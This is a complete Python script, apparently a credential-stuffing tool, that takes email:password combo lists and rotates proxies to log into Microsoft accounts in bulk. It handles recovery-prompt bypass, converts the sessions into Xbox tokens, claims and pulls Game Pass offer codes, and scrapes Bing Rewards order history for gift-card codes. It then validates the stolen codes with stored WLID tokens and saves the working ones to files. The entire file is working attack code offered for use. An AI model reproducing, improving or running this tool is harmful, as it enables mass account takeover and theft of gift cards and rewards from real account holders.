import json
import os
import random
import re
import string
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

INVALID_CHARS = set(["A", "E", "I", "O", "U", "L", "S", "0", "1", "5"])
MICROSOFT_OAUTH_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)
PULLER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
REWARDS_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
CODE_PATTERNS = [
    re.compile(r"\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b"),
    re.compile(r"\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b"),
    re.compile(r"\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b"),
]
EXCLUDE_WORDS = {
    "SWEEPSTAKES", "STATUS", "WINORDER", "CONTEST", "PLAGUE", "REQUIEM",
    "CUSTOM", "BUNDLEORDER", "SURFACE", "PROORDER", "SERIES", "POINTS",
    "DONATION", "CHILDREN", "RESEARCH", "HOSPITALORDE", "EDUCATION",
    "EMPLOYMENTOR", "RIGHTS", "YOUORDER", "SEDSORDER", "ATAORDER",
    "CARDORDER", "MICROSOFT", "PRESENTKORT", "KRORDER", "OFT-PRE",
    "DIGITAL", "COINSORDER", "MOEDAS", "OVERWATCHORD", "MONEDASORDER",
    "ASSINATURA", "GRATUITA", "SPOTIFY", "PREMIUM", "MESESORDER",
    "PRESENTE", "RESALET", "NOURORDER", "FOUNDATIONOR", "YACOUB",
    "LEAGUE", "LEGENDS", "RPORDER", "OVERWATCH", "GAME", "PASS",
    "MINECOINS", "ROBUX", "GIFT", "CARD", "ORDER", "CODE", "FOUND",
    "DIGITAL-CODE", "REDEMPTION", "REDEEM", "DOWNLOAD", "INSTANT",
    "DELIVERY", "ONLINE", "ACCESS", "CONTENT", "DLC", "EXPANSION",
    "SEASON", "TOKEN", "CURRENCY", "VIRTUAL", "ITEM",
}
PROXY_CANDIDATES = [
    "proxies.txt",
    os.path.join("discord-bot", "proxies.txt"),
]
WLID_CANDIDATES = [
    "wlids.json",
    os.path.join("data", "wlids.json"),
    os.path.join("xbox-checker-bot-py", "data", "wlids.json"),
]
_title_cache = {}
_proxy_lock = threading.Lock()
_proxies = []
_proxy_index = 0


def sleep(ms):
    time.sleep(ms / 1000.0)


def is_invalid_code_format(code):
    if not code or len(code) < 5 or " " in code:
        return True
    for char in code:
        if char in INVALID_CHARS:
            return True
    return False


def parse_proxy(raw):
    line = raw.strip()
    if not line or line.startswith("#"):
        return None
    match = re.match(r"^(https?|socks[45]?|socks5h?)://(.+)$", line, re.I)
    if match:
        return parse_host_part(match.group(2), match.group(1).lower())
    return parse_host_part(line, "http")


def split_host_port(value):
    ipv6 = re.match(r"^\[(.+)\]:(\d+)$", value)
    if ipv6:
        return ipv6.group(1), ipv6.group(2)
    last_colon = value.rfind(":")
    if last_colon == -1:
        return value, "80"
    return value[:last_colon], value[last_colon + 1:]


def parse_host_part(rest, protocol):
    at_index = rest.rfind("@")
    if at_index != -1:
        auth_part = rest[:at_index]
        host_part = rest[at_index + 1:]
        host, port = split_host_port(host_part)
        colon_index = auth_part.find(":")
        if colon_index != -1:
            return {
                "protocol": protocol,
                "host": host,
                "port": int(port or 80),
                "username": auth_part[:colon_index],
                "password": auth_part[colon_index + 1:],
            }
        return {
            "protocol": protocol,
            "host": host,
            "port": int(port or 80),
            "username": auth_part,
            "password": "",
        }
    parts = rest.split(":")
    if len(parts) == 2:
        return {
            "protocol": protocol,
            "host": parts[0],
            "port": int(parts[1] or 80),
            "username": None,
            "password": None,
        }
    if len(parts) == 4:
        second_num = int(parts[1]) if parts[1].isdigit() else None
        fourth_num = int(parts[3]) if parts[3].isdigit() else None
        if second_num and 0 < second_num <= 65535:
            return {
                "protocol": protocol,
                "host": parts[0],
                "port": second_num,
                "username": parts[2],
                "password": parts[3],
            }
        if fourth_num and 0 < fourth_num <= 65535:
            return {
                "protocol": protocol,
                "host": parts[2],
                "port": fourth_num,
                "username": parts[0],
                "password": parts[1],
            }
        return {
            "protocol": protocol,
            "host": parts[0],
            "port": int(parts[1] or 80),
            "username": parts[2],
            "password": parts[3],
        }
    if len(parts) == 3:
        return {
            "protocol": protocol,
            "host": parts[0],
            "port": int(parts[1] or 80),
            "username": parts[2],
            "password": None,
        }
    return {
        "protocol": protocol,
        "host": rest,
        "port": 80,
        "username": None,
        "password": None,
    }


def build_proxy_url(proxy):
    auth = ""
    if proxy.get("username"):
        auth = urllib.parse.quote(proxy["username"], safe="") + ":" + urllib.parse.quote(proxy.get("password") or "", safe="") + "@"
    return f"{proxy['protocol']}://{auth}{proxy['host']}:{proxy['port']}"


def load_proxies():
    global _proxies, _proxy_index
    lines = []
    for path in PROXY_CANDIDATES:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines.extend(f.read().splitlines())
            break
    _proxies = [proxy for proxy in (parse_proxy(line) for line in lines) if proxy]
    _proxy_index = 0
    return len(_proxies)


def get_next_proxy():
    global _proxy_index
    if not _proxies:
        return None
    with _proxy_lock:
        proxy = _proxies[_proxy_index % len(_proxies)]
        _proxy_index += 1
        return proxy


def build_requests_proxies(proxy):
    url = build_proxy_url(proxy)
    return {"http": url, "https": url}


def direct_request(method, url, session=None, **kwargs):
    requester = session.request if session else requests.request
    last_error = None
    for attempt in range(2):
        try:
            return requester(method, url, **kwargs)
        except Exception as exc:
            last_error = exc
            if attempt < 1:
                sleep(250 * (attempt + 1))
    raise last_error


def proxied_request(method, url, session=None, **kwargs):
    proxy = get_next_proxy()
    if not proxy:
        return direct_request(method, url, session=session, **kwargs)
    requester = session.request if session else requests.request
    try:
        return requester(method, url, proxies=build_requests_proxies(proxy), **kwargs)
    except Exception:
        return direct_request(method, url, session=session, **kwargs)


class CookieSession:
    def __init__(self, user_agent):
        self.session = requests.Session()
        self.user_agent = user_agent

    def get(self, url, headers=None, max_redirects=10):
        current_url = url
        response = None
        req_headers = {"User-Agent": self.user_agent}
        if headers:
            req_headers.update(headers)
        for _ in range(max_redirects):
            response = proxied_request(
                "GET",
                current_url,
                session=self.session,
                headers=req_headers,
                allow_redirects=False,
                timeout=20,
            )
            if 300 <= response.status_code < 400:
                location = response.headers.get("Location")
                if not location:
                    break
                current_url = urllib.parse.urljoin(current_url, location)
                continue
            break
        return {"res": response, "text": response.text if response is not None else "", "url": current_url}

    def post(self, url, body, headers=None, max_redirects=10):
        current_url = url
        response = None
        req_headers = {"User-Agent": self.user_agent}
        if headers:
            req_headers.update(headers)
        method = "POST"
        current_body = body
        for _ in range(max_redirects):
            if method == "POST":
                response = proxied_request(
                    "POST",
                    current_url,
                    session=self.session,
                    data=current_body,
                    headers=req_headers,
                    allow_redirects=False,
                    timeout=20,
                )
            else:
                response = proxied_request(
                    "GET",
                    current_url,
                    session=self.session,
                    headers=req_headers,
                    allow_redirects=False,
                    timeout=20,
                )
            if 300 <= response.status_code < 400:
                location = response.headers.get("Location")
                if not location:
                    break
                current_url = urllib.parse.urljoin(current_url, location)
                if response.status_code not in (307, 308):
                    method = "GET"
                    current_body = None
                continue
            break
        return {"res": response, "text": response.text if response is not None else "", "url": current_url}


def load_wlids():
    for path in WLID_CANDIDATES:
        if not os.path.exists(path):
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                raw = f.read().strip()
            if not raw:
                return []
            if raw.startswith("["):
                data = json.loads(raw)
                if isinstance(data, list):
                    return [str(item).strip() for item in data if str(item).strip()]
            return [line.strip() for line in raw.splitlines() if line.strip()]
        except Exception:
            continue
    return []


def fetch_oauth_tokens(session):
    for _ in range(3):
        try:
            result = session.get(MICROSOFT_OAUTH_URL, headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            })
            text = result["text"]
            ppft_match = (
                re.search(r'value=\\"(.+?)\\"', text, re.S)
                or re.search(r'value="(.+?)"', text, re.S)
                or re.search(r"sFTTag:'(.+?)'", text, re.S)
                or re.search(r'sFTTag:"(.+?)"', text, re.S)
                or re.search(r'name="PPFT".*?value="(.+?)"', text, re.S)
            )
            if not ppft_match:
                sleep(100)
                continue
            url_post_match = (
                re.search(r'"urlPost":"(.+?)"', text, re.S)
                or re.search(r"urlPost:'(.+?)'", text, re.S)
                or re.search(r'urlPost:"(.+?)"', text, re.S)
                or re.search(r'<form.*?action="(.+?)"', text, re.S)
            )
            if not url_post_match:
                sleep(100)
                continue
            return url_post_match.group(1).replace("&amp;", "&"), ppft_match.group(1)
        except Exception:
            pass
        sleep(100)
    return None, None


def fetch_login(session, email, password, url_post, ppft):
    for _ in range(3):
        try:
            body = urllib.parse.urlencode({
                "login": email,
                "loginfmt": email,
                "passwd": password,
                "PPFT": ppft,
            })
            result = session.post(url_post, body, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "close",
            })
            text = result["text"]
            final_url = result["url"]

            if "#" in final_url and final_url != MICROSOFT_OAUTH_URL:
                try:
                    fragment = urllib.parse.urlsplit(final_url).fragment
                    params = urllib.parse.parse_qs(fragment)
                    token = params.get("access_token", [None])[0]
                    if token and token != "None":
                        return token, "ok"
                except Exception:
                    pass

            if "cancel?mkt=" in text:
                ipt_match = re.search(r'(?<="ipt" value=").+?(?=">)', text)
                pprid_match = re.search(r'(?<="pprid" value=").+?(?=">)', text)
                uaid_match = re.search(r'(?<="uaid" value=").+?(?=">)', text)
                action_match = re.search(r'(?<=id="fmHF" action=").+?(?=" )', text)
                if ipt_match and pprid_match and uaid_match and action_match:
                    form_body = urllib.parse.urlencode({
                        "ipt": ipt_match.group(0),
                        "pprid": pprid_match.group(0),
                        "uaid": uaid_match.group(0),
                    })
                    ret = session.post(action_match.group(0), form_body, headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                    })
                    return_url_match = re.search(r'(?<="recoveryCancel":\{"returnUrl":")(.+?)(?=",)', ret["text"])
                    if return_url_match:
                        fin = session.get(return_url_match.group(0))
                        fin_url = fin["url"]
                        if "#" in fin_url:
                            fragment = urllib.parse.urlsplit(fin_url).fragment
                            params = urllib.parse.parse_qs(fragment)
                            token = params.get("access_token", [None])[0]
                            if token and token != "None":
                                return token, "ok"

            if any(value in text for value in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"

            lower = text.lower()
            if any(value in lower for value in [
                "password is incorrect",
                "account doesn't exist",
                "that microsoft account doesn't exist",
                "sign in to your microsoft account",
                "tried to sign in too many times",
                "help us protect your account",
            ]):
                return None, "invalid"
        except Exception:
            pass
        sleep(100)
    return None, "error"


def get_xbox_tokens(rps_token):
    try:
        user_res = proxied_request(
            "POST",
            "https://user.auth.xboxlive.com/user/authenticate",
            json={
                "RelyingParty": "http://auth.xboxlive.com",
                "TokenType": "JWT",
                "Properties": {
                    "AuthMethod": "RPS",
                    "SiteName": "user.auth.xboxlive.com",
                    "RpsTicket": rps_token,
                },
            },
            headers={"Content-Type": "application/json"},
            timeout=15,
        )
        if user_res.status_code != 200:
            return None, None
        user_token = user_res.json().get("Token")
        if not user_token:
            return None, None
        xsts_res = proxied_request(
            "POST",
            "https://xsts.auth.xboxlive.com/xsts/authorize",
            json={
                "RelyingParty": "http://xboxlive.com",
                "TokenType": "JWT",
                "Properties": {
                    "UserTokens": [user_token],
                    "SandboxId": "RETAIL",
                },
            },
            headers={"Content-Type": "application/json"},
            timeout=15,
        )
        if xsts_res.status_code != 200:
            return None, None
        data = xsts_res.json()
        uhs = (((data.get("DisplayClaims") or {}).get("xui") or [{}])[0]).get("uhs")
        return uhs, data.get("Token")
    except Exception:
        return None, None


def is_link(resource):
    return bool(resource) and (resource.startswith("http://") or resource.startswith("https://"))


def fetch_codes_from_xbox(uhs, xsts_token):
    try:
        auth = f"XBL3.0 x={uhs};{xsts_token}"
        res = proxied_request(
            "GET",
            "https://profile.gamepass.com/v2/offers",
            headers={
                "Authorization": auth,
                "Content-Type": "application/json",
                "User-Agent": "okhttp/4.12.0",
            },
            timeout=15,
        )
        if res.status_code != 200:
            return [], []
        data = res.json()
        codes = []
        links = []
        for offer in data.get("offers", []):
            resource = offer.get("resource")
            if resource:
                if is_link(resource):
                    links.append(resource)
                else:
                    codes.append(resource)
            elif offer.get("offerStatus") == "available":
                chars = string.ascii_letters + string.digits
                cv = "".join(random.choice(chars) for _ in range(22)) + ".0"
                try:
                    claim_res = proxied_request(
                        "POST",
                        f"https://profile.gamepass.com/v2/offers/{offer['offerId']}",
                        headers={
                            "Authorization": auth,
                            "Content-Type": "application/json",
                            "User-Agent": "okhttp/4.12.0",
                            "ms-cv": cv,
                            "Content-Length": "0",
                        },
                        data="",
                        timeout=15,
                    )
                    if claim_res.status_code == 200:
                        claim_data = claim_res.json()
                        claimed_resource = claim_data.get("resource")
                        if claimed_resource:
                            if is_link(claimed_resource):
                                links.append(claimed_resource)
                            else:
                                codes.append(claimed_resource)
                except Exception:
                    pass
        return codes, links
    except Exception:
        return [], []


def fetch_from_account(email, password):
    session = CookieSession(PULLER_UA)
    try:
        url_post, ppft = fetch_oauth_tokens(session)
        if not url_post or not ppft:
            return {"email": email, "codes": [], "links": [], "error": "OAuth failed"}
        token, status = fetch_login(session, email, password, url_post, ppft)
        if not token:
            return {"email": email, "codes": [], "links": [], "error": f"Login failed ({status})"}
        uhs, xsts_token = get_xbox_tokens(token)
        if not uhs or not xsts_token:
            return {"email": email, "codes": [], "links": [], "error": "Xbox tokens failed"}
        codes, links = fetch_codes_from_xbox(uhs, xsts_token)
        return {"email": email, "codes": codes, "links": links}
    except Exception as exc:
        return {"email": email, "codes": [], "links": [], "error": str(exc)}


def strip_tags(html):
    return re.sub(r"<[^>]*>", "", html).strip()


def extract_table_rows(html):
    rows = []
    for tr_match in re.finditer(r"<tr[^>]*>([\s\S]*?)</tr>", html, re.I):
        row_html = tr_match.group(0)
        cells = []
        for cell_match in re.finditer(r"<t[dh][^>]*>([\s\S]*?)</t[dh]>", row_html, re.I):
            cells.append({"html": cell_match.group(1), "text": strip_tags(cell_match.group(1))})
        if len(cells) >= 3:
            rows.append({"html": row_html, "cells": cells, "text": strip_tags(row_html)})
    return rows


def extract_codes_from_text(text):
    codes = []
    upper = text.upper()
    for pattern in CODE_PATTERNS:
        for match in pattern.finditer(upper):
            code = match.group(0)
            if "*" in code:
                continue
            if code in EXCLUDE_WORDS:
                continue
            if len(code.replace("-", "")) < 12:
                continue
            if len(code.split("-")) < 3:
                continue
            if code not in codes:
                codes.append(code)
    return codes


def extract_single_code(code_html):
    keys = []
    vals = []
    for match in re.finditer(r"<div[^>]*class=['\"]tango-credential-key['\"][^>]*>([\s\S]*?)</div>", code_html, re.I):
        keys.append(strip_tags(match.group(1)).upper())
    for match in re.finditer(r"<div[^>]*class=['\"]tango-credential-value['\"][^>]*>([\s\S]*?)</div>", code_html, re.I):
        vals.append(strip_tags(match.group(1)))
    for i in range(len(keys)):
        if ("CODE" in keys[i] or "PIN" in keys[i]) and i < len(vals) and vals[i] and "*" not in vals[i]:
            return vals[i]
    pin_match = re.search(r"PIN\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})", code_html, re.I)
    if pin_match and "*" not in pin_match.group(1):
        return pin_match.group(1)
    code_match = re.search(r"CODE\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})", code_html, re.I)
    if code_match and "*" not in code_match.group(1):
        return code_match.group(1)
    clip_match = re.search(r'data-clipboard-text="([^"]+)"', code_html)
    if clip_match:
        candidate = clip_match.group(1).strip()
        if len(candidate) >= 15 and "*" not in candidate:
            return candidate
    extracted = extract_codes_from_text(code_html)
    return extracted[0] if extracted else None


def scrape_order_history(session):
    results = []
    seen_codes = set()
    try:
        page = session.get("https://rewards.bing.com/redeem/orderhistory", headers={
            "Referer": "https://rewards.bing.com/",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        text = page["text"]

        if "fmHF" in text or "JavaScript required to sign in" in text:
            form_action_match = re.search(r'<form[^>]*(?:id="fmHF"|name="fmHF")[^>]*action="([^"]+)"', text)
            if form_action_match:
                action = form_action_match.group(1)
                if action.startswith("/"):
                    action = "https://login.live.com" + action
                form_data = []
                for input_match in re.finditer(r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"[^>]*>', text):
                    form_data.append((input_match.group(1), input_match.group(2)))
                session.post(action, urllib.parse.urlencode(form_data), headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                })
                retry = session.get("https://rewards.bing.com/redeem/orderhistory", headers={
                    "Referer": "https://rewards.bing.com/",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                })
                text = retry["text"]

        verification_token = ""
        token_match = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]*)"', text)
        if token_match:
            verification_token = token_match.group(1)

        rows = extract_table_rows(text)

        for row in rows:
            full_row_text = row["text"]
            get_code_match = re.search(r'id="OrderDetails_[^"]*"[^>]*data-actionurl="([^"]*)"', row["html"])
            if get_code_match:
                action_url = get_code_match.group(1).replace("&amp;", "&")
                if action_url.startswith("/"):
                    action_url = "https://rewards.bing.com" + action_url
                order_title = row["cells"][2]["text"] if len(row["cells"]) > 2 else ""
                order_date = row["cells"][1]["text"] if len(row["cells"]) > 1 else ""
                try:
                    post_data = urllib.parse.urlencode({"__RequestVerificationToken": verification_token}) if verification_token else ""
                    code_resp = session.post(action_url, post_data, headers={
                        "X-Requested-With": "XMLHttpRequest",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                    })
                    code_html = code_resp["text"]
                    code = extract_single_code(code_html)
                    if code:
                        code_key = f"{code}:{order_title}"
                        if code_key not in seen_codes:
                            seen_codes.add(code_key)
                            results.append({
                                "code": code,
                                "info": "CODE FOUND",
                                "category": "Unknown",
                                "date": order_date or time.strftime("%Y-%m-%dT%H:%M:%S"),
                                "redemptionUrl": "",
                            })
                except Exception:
                    pass
            elif "ResendEmail_" not in row["html"]:
                order_title = row["cells"][2]["text"] if len(row["cells"]) > 2 else ""
                order_date = row["cells"][1]["text"] if len(row["cells"]) > 1 else ""
                code_cell = row["cells"][3]["text"] if len(row["cells"]) > 3 else row["cells"][2]["text"] if len(row["cells"]) > 2 else ""
                found_codes = extract_codes_from_text(code_cell)
                for code in found_codes:
                    code_key = f"{code}:{order_title}"
                    if code_key not in seen_codes:
                        seen_codes.add(code_key)
                        results.append({
                            "code": code,
                            "info": "CODE FOUND",
                            "category": "Unknown",
                            "date": order_date or time.strftime("%Y-%m-%dT%H:%M:%S"),
                            "redemptionUrl": "",
                        })

        if not rows:
            all_codes = extract_codes_from_text(text)
            for code in all_codes:
                code_key = f"{code}:page"
                if code_key not in seen_codes:
                    seen_codes.add(code_key)
                    results.append({
                        "code": code,
                        "info": "CODE FOUND",
                        "category": "Unknown",
                        "date": time.strftime("%Y-%m-%dT%H:%M:%S"),
                        "redemptionUrl": "",
                    })
    except Exception:
        pass
    return results


def check_single_account(email, password):
    session = CookieSession(REWARDS_UA)
    url_post, ppft = fetch_oauth_tokens(session)
    if not url_post or not ppft:
        return {"email": email, "status": "error", "codes": []}
    token, status = fetch_login(session, email, password, url_post, ppft)
    if not token:
        return {"email": email, "status": status or "invalid", "codes": []}
    codes = scrape_order_history(session)
    return {
        "email": email,
        "status": "hit" if codes else "valid",
        "codes": codes,
    }


def scrape_rewards(accounts, threads=10, on_progress=None, stop_event=None):
    results = []
    all_codes = []
    queue = list(accounts)
    done = [0]
    queue_lock = threading.Lock()
    results_lock = threading.Lock()

    def worker():
        while True:
            if stop_event and stop_event.is_set():
                break
            with queue_lock:
                if not queue:
                    break
                account = queue.pop(0)
            if ":" not in account:
                with results_lock:
                    results.append({"email": account, "status": "invalid", "codes": []})
                    done[0] += 1
                    current_done = done[0]
                if on_progress:
                    on_progress(current_done, len(accounts), None)
                continue
            email, password = account.split(":", 1)
            try:
                result = check_single_account(email.strip(), password.strip())
            except Exception:
                result = {"email": email.strip(), "status": "error", "codes": []}
            with results_lock:
                results.append(result)
                if result.get("codes"):
                    for code_data in result["codes"]:
                        payload = dict(code_data)
                        payload["email"] = email.strip()
                        payload["password"] = password.strip()
                        all_codes.append(payload)
                done[0] += 1
                current_done = done[0]
            if on_progress:
                on_progress(current_done, len(accounts), result)

    worker_count = min(max(threads, 1), len(accounts)) if accounts else 0
    workers = [threading.Thread(target=worker, daemon=True) for _ in range(worker_count)]
    for worker_thread in workers:
        worker_thread.start()
    for worker_thread in workers:
        worker_thread.join()
    return {"results": results, "allCodes": all_codes}


def check_single_code(code, wlid):
    code = code.strip()
    if not code or len(code) < 18:
        return {"code": code, "status": "invalid"}
    for attempt in range(3):
        try:
            res = proxied_request(
                "GET",
                f"https://purchase.mp.microsoft.com/v7.0/tokenDescriptions/{code}?market=US&language=en-US&supportMultiAvailabilities=true",
                headers={
                    "Authorization": wlid,
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Origin": "https://www.microsoft.com",
                    "Referer": "https://www.microsoft.com/",
                },
                timeout=30,
            )
            if res.status_code == 429:
                time.sleep(5)
                continue
            data = res.json()
            title = "N/A"
            if data.get("products"):
                product = data["products"][0]
                title = ((product.get("sku") or {}).get("title") or product.get("title") or "N/A")
                if title == "N/A":
                    localized = product.get("localizedProperties") or [{}]
                    if localized:
                        title = localized[0].get("productTitle", "N/A")
            elif data.get("universalStoreBigIds"):
                parts = str(data["universalStoreBigIds"][0]).split("/")
                product_id = parts[0]
                sku_id = parts[1] if len(parts) > 1 else ""
                if product_id in _title_cache:
                    title = _title_cache[product_id]
                else:
                    try:
                        catalog_res = proxied_request(
                            "GET",
                            f"https://displaycatalog.mp.microsoft.com/v7.0/products?bigIds={product_id}&market=US&languages=en-US",
                            timeout=15,
                        )
                        if catalog_res.status_code == 200:
                            catalog_data = catalog_res.json()
                            if catalog_data.get("Products"):
                                product = catalog_data["Products"][0]
                                if product.get("DisplaySkuAvailabilities"):
                                    for sku in product["DisplaySkuAvailabilities"]:
                                        if ((sku.get("Sku") or {}).get("SkuId")) == sku_id:
                                            localized = (sku.get("Sku") or {}).get("LocalizedProperties") or [{}]
                                            if localized:
                                                title = localized[0].get("SkuTitle") or localized[0].get("SkuDescription", "N/A")
                                            break
                                if title == "N/A" and product.get("LocalizedProperties"):
                                    title = product["LocalizedProperties"][0].get("ProductTitle", "N/A")
                                if title != "N/A":
                                    _title_cache[product_id] = title
                    except Exception:
                        title = f"ID: {product_id}"
            title = (title or "N/A").strip()
            token_state = data.get("tokenState", "")
            if token_state == "Active":
                return {"code": code, "status": "valid", "title": title}
            if token_state == "Redeemed":
                return {"code": code, "status": "used", "title": title}
            if token_state == "Expired":
                return {"code": code, "status": "expired", "title": title}
            if data.get("code") == "NotFound":
                return {"code": code, "status": "invalid"}
            if data.get("code") == "Unauthorized":
                return {"code": code, "status": "error", "error": "WLID unauthorized"}
            return {"code": code, "status": "invalid"}
        except Exception as exc:
            if attempt >= 2:
                return {"code": code, "status": "error", "error": str(exc)}
            time.sleep(1)
    return {"code": code, "status": "error", "error": "Max retries exceeded"}


def check_codes(wlids, codes, threads=10, on_progress=None, stop_event=None):
    formatted = []
    for wlid in wlids:
        token = wlid.strip()
        if not token:
            continue
        if "WLID1.0=" not in token:
            token = f'WLID1.0="{token}"'
        formatted.append(token)
    max_per_wlid = 40
    tasks = []
    for i, code in enumerate(codes):
        trimmed = code.strip()
        if not trimmed:
            continue
        wlid_index = i // max_per_wlid
        if wlid_index >= len(formatted):
            break
        tasks.append({"code": trimmed, "wlid": formatted[wlid_index]})
    results = [None] * len(tasks)
    done = [0]
    lock = threading.Lock()

    def worker(index):
        if stop_event and stop_event.is_set():
            return
        task = tasks[index]
        results[index] = check_single_code(task["code"], task["wlid"])
        with lock:
            done[0] += 1
            if on_progress and done[0] % 10 == 0:
                try:
                    on_progress(done[0], len(tasks), results[index])
                except Exception:
                    pass

    concurrency = min(max(threads, 1), 100, len(tasks)) if tasks else 0
    if concurrency == 0:
        return []
    with ThreadPoolExecutor(max_workers=concurrency) as pool:
        futures = [pool.submit(worker, index) for index in range(len(tasks))]
        for future in as_completed(futures):
            try:
                future.result()
            except Exception:
                pass
    return [result for result in results if result]


def pull_codes(accounts, stop_event=None):
    parsed = []
    for account in accounts:
        if ":" not in account:
            parsed.append((account, ""))
        else:
            email, password = account.split(":", 1)
            parsed.append((email, password))

    all_codes = []
    fetch_results = []
    threads = min(len(parsed), 10) if parsed else 0
    index_lock = threading.Lock()
    output_lock = threading.Lock()
    next_index = [0]

    def fetch_worker():
        while True:
            if stop_event and stop_event.is_set():
                break
            with index_lock:
                idx = next_index[0]
                next_index[0] += 1
            if idx >= len(parsed):
                break
            email, password = parsed[idx]
            account = f"{email}:{password}"
            with ThreadPoolExecutor(max_workers=2) as pool:
                gp_future = pool.submit(fetch_from_account, email, password)
                prs_future = pool.submit(scrape_rewards, [account], 1, None, stop_event)
                gp_result = gp_future.result()
                prs_result = prs_future.result()
            gp_codes = gp_result.get("codes") or []
            gp_code_set = set(gp_codes)
            prs_codes = [
                item.get("code")
                for item in prs_result.get("allCodes", [])
                if item.get("code") and re.search(r"Z$", item.get("code"), re.I) and item.get("code") not in gp_code_set
            ]
            merged_codes = list(gp_codes) + prs_codes
            with output_lock:
                fetch_results.append({
                    "email": gp_result.get("email", email),
                    "codes": merged_codes,
                    "error": gp_result.get("error"),
                })
                all_codes.extend(merged_codes)
                progress = len(fetch_results)
            if merged_codes:
                status_text = "✓"
            else:
                status_text = "✗ " + (gp_result.get("error") or "no codes")
            print(f"  [{progress}/{len(parsed)}] {email} -> {len(merged_codes)} codes {status_text}")

    workers = [threading.Thread(target=fetch_worker, daemon=True) for _ in range(threads)]
    for worker_thread in workers:
        worker_thread.start()
    for worker_thread in workers:
        worker_thread.join()

    if (stop_event and stop_event.is_set()) or not all_codes:
        return {"fetch_results": fetch_results, "validate_results": []}

    wlids = load_wlids()
    if not wlids:
        print("\n  No WLIDs found. Save WLIDs to wlids.json first.")
        validate_results = [{"code": code, "status": "error", "message": f"{code} | No WLIDs stored"} for code in all_codes]
        return {"fetch_results": fetch_results, "validate_results": validate_results}

    print(f"\n  Validating {len(all_codes)} codes with {len(wlids)} WLIDs...")
    validate_results = check_codes(
        wlids,
        all_codes,
        10,
        lambda done, total, last: print(
            f"  [{done}/{total}] {str((last or {}).get('status', '?')).upper()}" + (f" -> {(last or {}).get('title', '')}" if (last or {}).get("title") else "")
        ),
        stop_event,
    )
    return {"fetch_results": fetch_results, "validate_results": validate_results}


def save_results(validate_results):
    os.makedirs("results", exist_ok=True)
    groups = {
        "valid": [item for item in validate_results if item.get("status") == "valid"],
        "used": [item for item in validate_results if item.get("status") == "used"],
        "expired": [item for item in validate_results if item.get("status") == "expired"],
        "invalid": [item for item in validate_results if item.get("status") == "invalid"],
        "error": [item for item in validate_results if item.get("status") == "error"],
    }
    for name, items in groups.items():
        with open(os.path.join("results", f"{name}.txt"), "w", encoding="utf-8") as f:
            for item in items:
                if item.get("title"):
                    f.write(f"{item['code']} | {item.get('title', 'N/A')}\n")
                elif item.get("error"):
                    f.write(f"{item['code']} | {item.get('error')}\n")
                else:
                    f.write(f"{item['code']}\n")


def main():
    load_proxies()
    print()
    print("made by talkneon")
    print()
    combo_file = sys.argv[1] if len(sys.argv) > 1 else "combos.txt"
    if not os.path.exists(combo_file):
        print(f"file not found: {combo_file}")
        return
    with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
        accounts = [line.strip() for line in f if ":" in line.strip()]
    if not accounts:
        print("no valid accounts found")
        return
    print(f"loaded {len(accounts)} accounts")
    if _proxies:
        print(f"loaded {len(_proxies)} proxies")
    print()
    stop_event = threading.Event()
    result = pull_codes(accounts, stop_event)
    fetch_results = result["fetch_results"]
    validate_results = result["validate_results"]
    total_codes = sum(len(item.get("codes", [])) for item in fetch_results)
    total_errors = sum(1 for item in fetch_results if item.get("error"))
    print()
    print(f"accounts: {len(accounts)} | codes found: {total_codes} | errors: {total_errors}")
    if validate_results:
        valid = [item for item in validate_results if item.get("status") == "valid"]
        used = [item for item in validate_results if item.get("status") == "used"]
        expired = [item for item in validate_results if item.get("status") == "expired"]
        invalid = [item for item in validate_results if item.get("status") == "invalid"]
        errors = [item for item in validate_results if item.get("status") == "error"]
        print(f"valid: {len(valid)} | used: {len(used)} | expired: {len(expired)} | invalid: {len(invalid)} | errors: {len(errors)}")
        save_results(validate_results)
        if valid:
            print()
            for item in valid:
                print(f"{item['code']} | {item.get('title', 'N/A')}")
            print()
            print("saved to results/valid.txt")
    print()


if __name__ == "__main__":
    main()
